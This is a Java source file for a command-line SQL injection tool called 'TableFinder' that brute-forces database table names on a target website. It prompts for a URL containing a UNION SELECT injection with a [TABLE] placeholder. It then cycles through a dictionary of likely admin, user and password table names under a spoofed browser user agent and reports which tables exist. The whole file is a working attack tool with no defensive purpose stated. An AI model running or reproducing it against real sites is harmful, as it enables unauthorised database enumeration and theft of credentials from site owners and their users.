/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.bluediamond.functionality;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

/**
 *
 * @author Abaco Team
 */
public class TableFinder implements IFunctionality {
    private static String TBL_PATTERN = "[TABLE]";
    private static String[] DIC_TABLES = {  "admin",
                                            "admins",
                                            "administrator",
                                            "amministrazione",
                                            "account",
                                            "accnts",
                                            "accnt",
                                            "user_id",
                                            "accounts",
                                            "adminlogin",
                                            "auth",
                                            "authenticate",
                                            "authentication",
                                            "account",
                                            "access",
                                            "accesso",
                                            "customers",
                                            "customer",
                                            "gestione",
                                            "login",
                                            "logout",
                                            "loginout",
                                            "log",
                                            "member",
                                            "membri",
                                            "members",
                                            "memberid",
                                            "name",
                                            "operatori",
                                            "operatore",
                                            "password",
                                            "pass",
                                            "passwd",
                                            "passw",
                                            "pword",
                                            "pwrd",
                                            "pwd",
                                            "tbl_utenti",
                                            "usrs",
                                            "usr2",
                                            "users",
                                            "utenti",
                                            "Utenti",
                                            "Users",
                                            "User",
                                            "username",
                                            "user",
                                            "User",
                                            "user_name",
                                            "user_username",
                                            "uname",
                                            "user_uname",
                                            "usern",
                                            "user_usern",
                                            "user_un",
                                            "usrnm",
                                            "user_usrnm",
                                            "usr",
                                            "usernm",
                                            "user_usernm",
                                            "user_nm",
                                            "user_password",
                                            "userpass",
                                            "user_pass",
                                            "user_pword",
                                            "user_passw",
                                            "user_pwrd",
                                            "user_pwd",
                                            "user_passwd"
                                            
                                            };
    private URL WebSite;
    private String baseUrl;
    private String PatternError;
    private String tabPrefix;
    private boolean DEBUG;
    
    private void Init(String Url,  String pattern_error, String tabPrefix, String debug)
    {
        this.DEBUG = debug.trim().equals("1");
        this.tabPrefix = (tabPrefix != null && tabPrefix.trim().length() > 0) ? tabPrefix : "";
        this.baseUrl = Url.replace(" ","%20");
        //this.baseUrl = Url.replace(" ","+");
        this.PatternError = pattern_error;
    }

    public void startInjection()
    {
        HttpURLConnection conn;
        try
        {
            
            if(!this.baseUrl.contains(TBL_PATTERN))
            {
                System.out.println("TBL PATTERN doesn't FOUND! : " +TBL_PATTERN);
                return;
            }
             
             
            int i = 0;
            while(i < DIC_TABLES.length)
            {
                String table_temp = tabPrefix  + DIC_TABLES[i];
                WebSite = new URL(this.baseUrl.replace(TBL_PATTERN, table_temp));
                conn = (HttpURLConnection)WebSite.openConnection();
                conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; H010818)");
                conn.setDoOutput(true);
                if(conn.getResponseCode() != 200)
                {
                    System.out.println("[-] NOT FOUND ("+conn.getResponseCode()+")"+table_temp);
                    i++;
                    Thread.currentThread().sleep(600);
                    continue;
                }
                BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String line = "";
                String response = "";
                while ((line = rd.readLine()) != null)
                    response += line;
                if(DEBUG)
                    System.out.println("DEBUG\n"+response);
                rd.close();
                if(response.toLowerCase().contains(PatternError.toLowerCase()))
                    System.out.println("[-] NOT FOUND: " +table_temp);
                else
                    System.out.println("[+] FOUND: " +table_temp);
                i++;
                Thread.currentThread().sleep(600);
            }

        }
        catch (Exception ex)
        {
            System.out.println("Managed Ex in startInjection:\n"+ex.getMessage());
        }
    }

    @Override
    public String getName() {
        return "TableFinder";
    }

    @Override
    public void run() {
        String usage = "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
        usage+=         "\t>             Talbe User Finder          >>\n";
        usage+=         "\t>               By Maken                 >>\n";
        usage+=         "\t>                                        >>\n";
        usage+=         "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
        usage+=         "\n";
        usage+= "Please insert site to inject: [ex: http://www.site.com/index.php?id=-1 UNION SELECT 1,2,3 from [TABLE]]";
        System.out.println(usage);
        Scanner in = new Scanner(System.in);
        String site = in.nextLine();
        usage = "Please insert any table prefix to inject (blank if none): [ex: tbl_]";
        System.out.println(usage);
        String tab_prefix = in.nextLine();
        usage= "Please insert error pattern: [ex: Microsoft JET Database Engine]";
        System.out.println(usage);
        String error = in.nextLine();
        usage= "Please insert 1 if you want print DEBUG";
        System.out.println(usage);
        String debug = in.nextLine();
        
        this.Init(site,error,tab_prefix,debug);
        this.startInjection();
    }
}
